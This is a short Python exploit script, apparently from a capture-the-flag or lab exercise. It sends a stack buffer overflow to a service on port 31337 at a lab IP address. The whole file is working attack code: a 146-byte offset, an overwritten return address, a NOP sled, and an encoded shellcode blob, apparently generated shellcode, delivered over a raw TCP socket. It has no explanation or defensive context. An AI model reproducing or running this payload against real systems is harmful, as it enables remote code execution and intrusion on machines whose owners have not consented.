#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.155.93"

port = 31337
timeout = 5

#eip offset 146
#esp offset 2814
offset = 146
of = "A" *offset 
retn = "\xc3\x14\x04\x08"
# Bad chars \x00\x0a
payload = ("\xdd\xc7\xd9\x74\x24\xf4\x5b\xb8\xa8\x49\x86\x3d\x29\xc9\xb1"
"\x52\x31\x43\x17\x03\x43\x17\x83\x6b\x4d\x64\xc8\x97\xa6\xea"
"\x33\x67\x37\x8b\xba\x82\x06\x8b\xd9\xc7\x39\x3b\xa9\x85\xb5"
"\xb0\xff\x3d\x4d\xb4\xd7\x32\xe6\x73\x0e\x7d\xf7\x28\x72\x1c"
"\x7b\x33\xa7\xfe\x42\xfc\xba\xff\x83\xe1\x37\xad\x5c\x6d\xe5"
"\x41\xe8\x3b\x36\xea\xa2\xaa\x3e\x0f\x72\xcc\x6f\x9e\x08\x97"
"\xaf\x21\xdc\xa3\xf9\x39\x01\x89\xb0\xb2\xf1\x65\x43\x12\xc8"
"\x86\xe8\x5b\xe4\x74\xf0\x9c\xc3\x66\x87\xd4\x37\x1a\x90\x23"
"\x45\xc0\x15\xb7\xed\x83\x8e\x13\x0f\x47\x48\xd0\x03\x2c\x1e"
"\xbe\x07\xb3\xf3\xb5\x3c\x38\xf2\x19\xb5\x7a\xd1\xbd\x9d\xd9"
"\x78\xe4\x7b\x8f\x85\xf6\x23\x70\x20\x7d\xc9\x65\x59\xdc\x86"
"\x4a\x50\xde\x56\xc5\xe3\xad\x64\x4a\x58\x39\xc5\x03\x46\xbe"
"\x2a\x3e\x3e\x50\xd5\xc1\x3f\x79\x12\x95\x6f\x11\xb3\x96\xfb"
"\xe1\x3c\x43\xab\xb1\x92\x3c\x0c\x61\x53\xed\xe4\x6b\x5c\xd2"
"\x15\x94\xb6\x7b\xbf\x6f\x51\x8e\x48\xb0\xbb\xe6\x4a\x4e\xad"
"\xaa\xc3\xa8\xa7\x42\x82\x63\x50\xfa\x8f\xff\xc1\x03\x1a\x7a"
"\xc1\x88\xa9\x7b\x8c\x78\xc7\x6f\x79\x89\x92\xcd\x2c\x96\x08"
"\x79\xb2\x05\xd7\x79\xbd\x35\x40\x2e\xea\x88\x99\xba\x06\xb2"
"\x33\xd8\xda\x22\x7b\x58\x01\x97\x82\x61\xc4\xa3\xa0\x71\x10"
"\x2b\xed\x25\xcc\x7a\xbb\x93\xaa\xd4\x0d\x4d\x65\x8a\xc7\x19"
"\xf0\xe0\xd7\x5f\xfd\x2c\xae\xbf\x4c\x99\xf7\xc0\x61\x4d\xf0"
"\xb9\x9f\xed\xff\x10\x24\x0d\xe2\xb0\x51\xa6\xbb\x51\xd8\xab"
"\x3b\x8c\x1f\xd2\xbf\x24\xe0\x21\xdf\x4d\xe5\x6e\x67\xbe\x97"
"\xff\x02\xc0\x04\xff\x06")
padding = "\x90"*16
buf = of + retn + padding + payload

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(bytes(buf+"\n", "latin-1"))
s.close()
print("Done!")